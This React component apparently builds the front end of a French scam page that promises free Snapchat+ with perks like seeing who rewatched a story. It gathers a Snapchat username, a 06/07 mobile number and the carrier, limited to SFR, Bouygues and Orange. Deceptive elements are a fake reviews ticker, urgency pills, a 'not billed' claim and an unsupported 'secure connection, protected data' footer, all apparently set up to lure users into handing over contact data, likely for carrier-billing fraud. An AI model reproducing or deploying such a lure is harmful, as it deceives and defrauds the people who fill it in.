import { useState } from "react";
import { motion } from "framer-motion";
import { AtSign, Phone, AlertTriangle, Star, Eye, Rocket, Zap, ChevronRight, ChevronDown } from "lucide-react";
import { base44 } from "@/api/base44Client";
import ReviewsTicker from "@/components/ReviewsTicker";
import Logo from "@/components/Logo";
import Turnstile from "@/components/Turnstile";

const operators = [
  { id: "SFR", label: "SFR", color: "text-red-400", activeBorder: "border-red-500/60", activeBg: "bg-red-500/10" },
  { id: "Bouygues", label: "Bouygues", color: "text-blue-400", activeBorder: "border-blue-500/60", activeBg: "bg-blue-500/10" },
  { id: "Orange", label: "Orange", color: "text-orange-400", activeBorder: "border-orange-400/60", activeBg: "bg-orange-400/10" },
];

const features = [
  { icon: Star, label: "Badges exclusifs" },
  { icon: Eye, label: "Qui a revu votre story" },
  { icon: Rocket, label: "Boost de score" },
  { icon: Zap, label: "Offre limitée" },
];

export default function SubmissionForm({ onSubmit, loading, onStatusCheck, onFaqClick }) {
  const [form, setForm] = useState({ snapchat: "", telephone: "", operateur: "" });
  const [errors, setErrors] = useState({});
  const [rateLimitError, setRateLimitError] = useState("");
  const [turnstileToken, setTurnstileToken] = useState("");
  const [turnstileError, setTurnstileError] = useState("");


  const validate = () => {
    const newErrors = {};
    if (!form.snapchat.trim()) newErrors.snapchat = "Nom d'utilisateur requis";

    const tel = form.telephone.replace(/\s/g, "");
    if (!tel) {
      newErrors.telephone = "Numéro de téléphone requis";
    } else if (!/^(06|07)\d{8}$/.test(tel)) {
      newErrors.telephone = "Le numéro doit commencer par 06 ou 07 et contenir 10 chiffres";
    }

    if (!form.operateur) newErrors.operateur = "Choisis un opérateur";
    setErrors(newErrors);
    return Object.keys(newErrors).length === 0;
  };

  const formatTel = (digits) => {
    return digits.match(/.{1,2}/g)?.join(" ") || "";
  };

  const handleSnapchatChange = (e) => {
    const val = e.target.value.replace(/\s/g, "");
    setForm({ ...form, snapchat: val });
    if (errors.snapchat) setErrors({ ...errors, snapchat: "" });
  };

  const handleTelChange = (e) => {
    let val = e.target.value.replace(/[^\d]/g, "").slice(0, 10);
    if (val.length >= 2 && !val.startsWith("06") && !val.startsWith("07")) {
      return;
    }
    setForm({ ...form, telephone: val });
    if (errors.telephone) setErrors({ ...errors, telephone: "" });
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    setRateLimitError("");
    
    if (!validate()) return;

    if (!turnstileToken) {
      setTurnstileError("Vérification anti-bot requise");
      return;
    }

    onSubmit({ ...form, telephone: form.telephone.padStart(10, "0"), turnstileToken });
  };

  const selectedOp = operators.find((o) => o.id === form.operateur);

  return (
    <motion.div
      initial={{ opacity: 0, y: 24 }}
      animate={{ opacity: 1, y: 0 }}
      transition={{ duration: 0.5, ease: "easeOut" }}
      className="w-full max-w-sm mx-auto"
    >
      {/* Card */}
      <div className="bg-card border border-border rounded-3xl px-5 py-5 shadow-2xl shadow-black/60">

        {/* Logo */}
        <div className="mb-6">
          <Logo />
        </div>

        {/* Live notification badge */}
        <ReviewsTicker />

        {/* Features pills */}
        <div className="flex flex-wrap gap-2 justify-center mb-5">
          {features.map(({ icon: FeatureIcon, label }) => (
            <span
              key={label}
              className="flex items-center gap-1.5 px-3 py-1.5 rounded-full border border-border bg-secondary/20 text-foreground/70 text-xs font-medium"
            >
              <FeatureIcon className="w-3.5 h-3.5 text-primary" />
              {label}
            </span>
          ))}
        </div>



        {/* Operator warning */}
        <div className="bg-primary/10 border border-primary/30 rounded-xl px-4 py-3 mb-3 flex items-start gap-2.5">
          <span className="text-lg flex-shrink-0">⚠️</span>
          <p className="text-primary text-xs leading-relaxed">
            Disponible uniquement pour les numéros{" "}
            <span className="font-bold underline text-red-400">SFR</span>,{" "}
            <span className="font-bold underline text-blue-400">Bouygues Telecom</span> et{" "}
            <span className="font-bold underline text-orange-400">Orange</span> —{" "}
            tous les autres opérateurs ne fonctionnent pas
          </p>
        </div>

        <form onSubmit={handleSubmit} className="space-y-3">
           {rateLimitError && (
             <div className="bg-destructive/10 border border-destructive/30 rounded-xl p-3 flex gap-2">
               <AlertTriangle className="w-4 h-4 text-destructive flex-shrink-0 mt-0.5" />
               <p className="text-destructive text-xs">{rateLimitError}</p>
             </div>
           )}
           {/* Snapchat */}
          <div className="space-y-1.5">
            <label className="text-sm font-semibold text-foreground/90">
              Nom d'utilisateur Snapchat
            </label>
            <div className="relative">
              <AtSign className="absolute left-3.5 top-1/2 -translate-y-1/2 w-4 h-4 text-muted-foreground" />
              <input
                type="text"
                placeholder="votre_snap"
                value={form.snapchat}
                onChange={handleSnapchatChange}
                autoComplete="off"
                inputMode="text"
                className="w-full bg-secondary/30 border border-border rounded-xl pl-10 pr-4 py-3.5 text-foreground placeholder:text-muted-foreground focus:outline-none focus:ring-2 focus:ring-primary/40 focus:border-primary/40 transition-all text-base"
              />
            </div>
            {errors.snapchat && (
              <p className="text-destructive text-xs font-medium">{errors.snapchat}</p>
            )}
          </div>

          {/* Opérateur */}
          <div className="space-y-1.5">
            <label className="text-sm font-semibold text-foreground/90">
              Opérateur mobile
            </label>
            <div className="grid grid-cols-3 gap-2">
              {operators.map((op) => (
                <motion.button
                  key={op.id}
                  type="button"
                  whileHover={{ scale: 1.03 }}
                  whileTap={{ scale: 0.97 }}
                  onClick={() => {
                    setForm({ ...form, operateur: op.id });
                    if (errors.operateur) setErrors({ ...errors, operateur: "" });
                  }}
                  className={`py-3.5 rounded-xl border-2 font-bold text-sm transition-all duration-200
                    ${form.operateur === op.id
                      ? `${op.activeBorder} ${op.activeBg} ${op.color}`
                      : "border-border bg-secondary/20 text-muted-foreground hover:border-border hover:text-foreground"
                    }`}
                >
                  {op.label}
                </motion.button>
              ))}
            </div>
            {errors.operateur && (
              <p className="text-destructive text-xs font-medium">{errors.operateur}</p>
            )}
          </div>

          {/* Téléphone */}
          <div className="space-y-1.5">
            <label className="text-sm font-semibold text-foreground/90">
              Numéro de téléphone
            </label>
            <div className="flex items-center bg-secondary/30 border border-border rounded-xl px-3.5 gap-2 focus-within:ring-2 focus-within:ring-primary/40 focus-within:border-primary/40 transition-all">
              <Phone className="w-4 h-4 text-muted-foreground flex-shrink-0" />
              <span className="text-lg flex-shrink-0">🇫🇷</span>
              <span className="text-muted-foreground text-sm font-medium flex-shrink-0">+33</span>
              <div className="w-px h-5 bg-border flex-shrink-0" />
              <input
                type="tel"
                placeholder="Votre numéro"
                value={formatTel(form.telephone)}
                onChange={handleTelChange}
                autoComplete="tel"
                inputMode="numeric"
                className="flex-1 bg-transparent py-3.5 text-foreground placeholder:text-muted-foreground focus:outline-none text-base min-w-0"
              />
            </div>
            {errors.telephone && (
              <p className="text-destructive text-xs font-medium">{errors.telephone}</p>
            )}
            <p className="text-muted-foreground/60 text-xs">
              Uniquement les numéros commençant par 06 ou 07
            </p>
          </div>

          {/* Cloudflare Turnstile anti-bot */}
          <p className="text-muted-foreground/70 text-xs text-center mb-2">
            C'est pour savoir si vous êtes un humain 🤖
          </p>
          <Turnstile
            onVerify={(token) => { setTurnstileToken(token); setTurnstileError(""); }}
            onExpire={() => setTurnstileToken("")}
            onError={() => setTurnstileError("Vérification échouée, réessaie")}
          />
          {turnstileError && (
            <p className="text-destructive text-xs font-medium -mt-1">{turnstileError}</p>
          )}

          {/* Submit */}
          <motion.button
            type="submit"
            disabled={loading}
            whileHover={{ scale: loading ? 1 : 1.02 }}
            whileTap={{ scale: loading ? 1 : 0.98 }}
            className="w-full bg-primary text-primary-foreground font-bold py-4 rounded-xl text-base tracking-wide transition-all duration-200 disabled:opacity-60 disabled:cursor-not-allowed shadow-lg shadow-primary/30 flex items-center justify-center gap-2"
          >
            {loading ? (
              <>
                <span className="w-5 h-5 border-2 border-primary-foreground/30 border-t-primary-foreground rounded-full animate-spin" />
                Traitement en cours...
              </>
            ) : (
              <>
                Continuer
                <ChevronRight className="w-5 h-5" />
              </>
            )}
          </motion.button>
        </form>

        {/* Footer note */}
        <p className="text-center text-muted-foreground/50 text-xs mt-3 leading-tight">
          L'abonnement Snapchat+ ne vous sera pas facturé.<br />
          L'abonnement est disponible uniquement pour les utilisateurs éligibles.
        </p>
      </div>


      {/* Bottom links */}
      <div className="mt-4 text-center space-y-2">
        <button 
          type="button"
          onClick={onFaqClick}
          className="text-muted-foreground/60 text-xs flex items-center gap-1 mx-auto hover:text-muted-foreground transition-colors"
        >
          Questions fréquentes <ChevronDown className="w-3 h-3" />
        </button>
        <button 
          type="button"
          onClick={onStatusCheck}
          className="text-muted-foreground/60 text-xs hover:text-muted-foreground transition-colors"
        >
          Suivre l'état de ma demande →
        </button>
      </div>

      {/* Security footer */}
      <p className="text-muted-foreground/40 text-xs text-center mt-6">
        🔒 Connexion sécurisée • Données protégées
      </p>
    </motion.div>
  );
}